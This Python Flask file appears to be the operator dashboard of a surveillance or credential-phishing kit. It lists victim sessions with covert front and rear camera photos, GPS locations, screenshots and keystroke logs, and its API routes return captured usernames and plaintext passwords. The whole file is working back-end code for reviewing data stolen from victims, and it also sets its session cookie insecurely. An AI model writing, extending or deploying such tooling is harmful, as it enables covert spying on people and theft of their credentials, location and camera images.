from flask import Blueprint, render_template, request, redirect, url_for, make_response, jsonify
from app.auth import create_token, login_required
from app.config import Config
from app.models import Session as SessionModel, Event, BurstPhoto, Keylog, Credential
import json

bp = Blueprint("dashboard", __name__)


@bp.route("/login", methods=["GET", "POST"])
def login_page():
    if request.method == "POST":
        u = request.form.get("user")
        p = request.form.get("pass")
        if u == Config.DASH_USER and p == Config.DASH_PASS:
            token = create_token(u)
            resp = make_response(redirect(url_for("dashboard.index")))
            resp.set_cookie("session_token", token, httponly=True, samesite=None, secure=False, max_age=86400*7, path="/")
            return resp
        return render_template("login.html", error="Username/password salah")
    return render_template("login.html")


@bp.route("/logout")
def logout():
    resp = make_response(redirect(url_for("dashboard.login_page")))
    resp.delete_cookie("session_token")
    return resp


@bp.route("/dashboard")
@login_required
def index():
    rows = SessionModel.query.order_by(SessionModel.id.desc()).limit(500).all()
    sessions = [r.to_dict() for r in rows]
    stats = {
        "total": SessionModel.query.count(),
        "with_photo": SessionModel.query.filter((SessionModel.has_depan == 1) | (SessionModel.has_belakang == 1)).count(),
        "with_gps": SessionModel.query.filter(SessionModel.lat.isnot(None)).count(),
        "with_screenshot": SessionModel.query.filter(SessionModel.has_screenshot == 1).count(),
        "keys_total": Keylog.query.count(),
        "creds_total": Credential.query.count(),
    }
    return render_template("dashboard.html", sessions=sessions, stats=stats, stats_json=json.dumps(stats))


@bp.route("/api/stats")
@login_required
def api_stats():
    return jsonify({"total": SessionModel.query.count()})


@bp.route("/api/session/<ts>/events")
@login_required
def api_events(ts):
    rows = Event.query.filter_by(session_ts=ts).order_by(Event.id.desc()).limit(200).all()
    return jsonify([{"id": r.id, "event_type": r.event_type, "data": r.data,
                     "created_at": r.created_at.isoformat() if r.created_at else None} for r in rows])


@bp.route("/api/session/<ts>/burst")
@login_required
def api_burst(ts):
    rows = BurstPhoto.query.filter_by(session_ts=ts).order_by(BurstPhoto.frame_num).all()
    return jsonify([{"id": r.id, "filename": r.filename, "frame_num": r.frame_num} for r in rows])


@bp.route("/api/session/<ts>/keys")
@login_required
def api_keys(ts):
    rows = Keylog.query.filter_by(session_ts=ts).order_by(Keylog.id).all()
    return jsonify([{"key": r.key, "target": r.target,
                     "created_at": r.created_at.isoformat() if r.created_at else None} for r in rows])


@bp.route("/api/session/<ts>/creds")
@login_required
def api_creds(ts):
    rows = Credential.query.filter_by(session_ts=ts).order_by(Credential.id).all()
    return jsonify([{"username": r.username, "password": r.password, "source": r.source} for r in rows])


@bp.route("/api/creds")
@login_required
def api_all_creds():
    rows = Credential.query.order_by(Credential.id.desc()).limit(200).all()
    return jsonify([{"ts": r.session_ts, "username": r.username, "password": r.password,
                     "source": r.source} for r in rows])
